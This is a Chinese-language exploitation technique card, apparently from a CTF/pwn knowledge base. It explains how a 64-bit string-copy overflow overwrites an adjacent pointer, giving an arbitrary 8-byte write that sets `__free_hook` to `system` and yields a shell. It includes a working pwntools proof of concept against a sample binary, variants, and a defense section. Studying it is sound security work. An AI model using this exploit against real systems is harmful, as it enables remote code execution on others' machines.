---
id: binary-pwn-stack-string-overflow-adjacent-heap-backup-freehook
title: 64 位字符串拷贝溢出改写相邻 heap_backup 指针：两阶段任意 8 字节写覆写 free_hook 为 system
type: scenario
domain: binary
path: binary/pwn/stack
technique: string-overflow-adjacent-heap-backup-freehook
aliases:
- 字符串溢出改指针
- heap_backup 覆盖
- 任意 8 字节写
- free_hook system
- 64 位配置编辑器
- strncpy 无界拷贝
tags:
- pwn
- stack-overflow
- 64bit
- string-overflow
- arbitrary-write
- free-hook
- ret2libc
- static-binary
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V181
  verified_at: '2026-11-06T17:43:14+08:00'
  notes: 已对照原文核对：strncpy(target,buf,strlen(buf)) 溢出 0x40 覆盖相邻 heap_backup 指针、备份分支任意 8 字节写、free_hook 两阶段写与退出 free(BSS) 链均与原文 exp 一致。未复跑，0x4E9E28/0x411500/BSS 为示例静态二进制地址，需按目标核对。
---

## 一句话结论

64 位程序中 `handle_edit` 用 `strncpy(target, buf, strlen(buf))` 把最长 199 字节输入拷进调用方的 64 字节栈缓冲区，溢出覆盖相邻的 `heap_backup` 指针；随后的备份逻辑把输入首 8 字节写到 `*heap_backup`，形成任意 8 字节写。先把 `heap_backup` 改成 `free_hook` 并写入 `system`，再改成 BSS 并写入 `/bin/sh`，退出时 `free(BSS)` 即触发 `system("/bin/sh")`。

## 原理

- **无界字符串拷贝**：`handle_edit(char *target_buffer, char **heap_backup)` 中 `fgets(buf, 200)` 读入最多 199 字节，随后 `strncpy(target_buffer, buf, strlen(buf))` 与 `target_buffer[strlen(buf)] = 0` 都没有用目标缓冲区大小限长。调用方传入的 `target_buffer` 是 `main` 栈上的 64 字节 `config` 数组，输入超过 0x40 字节后继续覆盖相邻的 `heap_backup` 指针槽。
- **任意 8 字节写**：备份分支执行 `*heap_backup = *(void **)buf`（反编译显示为 `*v7 = v9[0]`），即把输入的前 8 个字节写到 `heap_backup` 当前指向的地址。由于 `heap_backup` 已被上一条溢出改写，这个写操作的目标完全可控。
- **两阶段写 free_hook**：
  1. 第一次 edit 只发内容、不备份：输入 `'a'*0x40 + p64(free_hook)` 覆盖 `heap_backup = free_hook`；
  2. 第二次 edit 发 `p64(system)` 并选择备份：`*heap_backup = system`，即 `free_hook = system`；
  3. 第三次 edit 覆盖 `heap_backup = bss`；
  4. 第四次 edit 发 `/bin/sh` 并备份：把字符串写到 BSS；
  5. 退出时程序执行 `free(heap_backup)`（此时为 BSS），`free_hook` 被调用为 `system(BSS)`，拿到 shell。
- **为什么不需要泄露 libc**：示例二进制为静态、非 PIE，`system`（0x411500）与 `free_hook`（0x4E9E28）地址固定；若目标为动态/PIE，则需要先泄露 libc/基址，或者改用其他固定地址。
- **版本前提**：`__free_hook` 在 glibc 2.34 起被移除；该利用要求静态链接的 libc 或目标 glibc 仍导出 `__free_hook`（示例静态二进制满足）。若目标没有 `free_hook`，可改打 `__malloc_hook`/`exit_funcs`/GOT 等（需相应写原语）。

## 触发条件

- 64 位程序，`handle_edit` 存在无界 `strncpy`/`strcpy` 把用户输入拷入调用方的小栈缓冲区，且相邻栈变量是一个会被解引用写的指针（示例 `heap_backup`）。
- 程序提供“备份”分支，把输入首 8 字节写到该指针指向的地址（任意 8 字节写）。
- 目标静态/非 PIE 或已泄漏基址，能确定 `system`、`free_hook`、BSS 地址；glibc 仍有 `__free_hook`。
- 退出路径会 `free()` 被改写的指针（示例选项 3/程序退出时 `free(v11[0])`）。

## 利用步骤

1. 逆向后确认拷贝长度与栈布局：`fgets` 上限、`strncpy(..., strlen)` 目标缓冲区大小、`heap_backup` 相对缓冲区的偏移（示例 0x40）。
2. 确认备份分支的写操作是 `*heap_backup = first_qword`，并确认 `heap_backup` 在多次调用间保持（位于 main 栈帧）。
3. 第一次 edit 发送 `'a'*0x40 + p64(free_hook)`（不备份），把指针改成 hook。
4. 第二次 edit 发送 `p64(system)` 并选择备份，完成 `free_hook = system`。
5. 第三次 edit 发送 `'a'*0x40 + p64(bss)`，把指针改成可写字符串地址。
6. 第四次 edit 发送 `/bin/sh` 并备份，把字符串写入 BSS。
7. 选择退出/触发 free，`free(bss)` → `system("/bin/sh")`。

## PoC

```python
from pwn import *

elf = ELF('./secure_editor')
p = process(elf.path)

def edit(content, mode='n'):
    p.recvuntil(b"Save & Exit\n")
    p.sendline(b'1')
    p.recvuntil(b"new config data :\n")
    p.sendline(content)
    p.recvuntil(b"heap? (y/n): ")
    p.sendline(mode)

hook   = 0x4E9E28          # __free_hook（示例静态二进制）
system = 0x411500          # system（示例静态二进制）
bss    = elf.bss() + 0x100

edit(b'a' * 0x40 + p64(hook))     # 溢出 heap_backup -> free_hook
edit(p64(system), 'y')            # *heap_backup = system
edit(b'a' * 0x40 + p64(bss))      # 溢出 heap_backup -> bss
edit(b'/bin/sh', 'y')             # 写 "/bin/sh" 到 bss

p.recvuntil(b"Save & Exit\n")
p.sendline(b'3')                  # free(bss) -> system("/bin/sh")
p.interactive()
```

偏移 0x40、`hook`/`system`/`bss` 地址均取自文章示例，必须在目标上重新确认；若 `fgets` 上限或编译优化不同，溢出到指针的偏移会变化。

## 变体与关联

- **动态/PIE 目标**：先用 `puts`/`write` 泄露 libc 或代码基址，再计算 `system` 与 `__free_hook`；写原语不变。
- **无 free_hook**：改打 `__free_hook` 的替代（`__malloc_hook`、`_IO_list_all`、`exit_funcs`、GOT/`.fini_array`），或把指针改成返回地址所在栈槽做栈 ROP。
- **单阶段变体**：若程序在覆盖指针后立即解引用写（同一调用内），可省去“先覆盖再下一次调用写”的两步；本卡是跨调用保存指针的版本。
- 关联：[[binary-pwn-stack-restricted-char-overflow-heap-spray-pivot-32bit]]（32 位受限字符版本）、[[binary-pwn-stack-controlled-pointer-memcpy-environ-orw]]（另一种受控指针 + memcpy 写栈 + ORW 版本）、[[binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop]]（堆侧任意写/栈 ROP）。

## 检测与防御

- 代码修复：用 `strncpy(dst, src, sizeof(dst)-1)` 并显式置零；对输入长度做上限校验；不要把可被溢出的指针变量与用户缓冲区放在同一栈帧且相邻。
- 编译缓解：开启 PIE、栈保护（canary）、FORTIFY_SOURCE；动态链接并升级 glibc 移除 `__free_hook`。
- 检测：配置编辑接口出现超长输入后紧跟“备份”请求、`free()` 参数指向 BSS/代码段、`__free_hook` 被写入代码地址；运行时监控 `free` 调用栈异常。
- 事件响应：此类任意写通常直接导致 RCE，需重启服务并排查持久化。
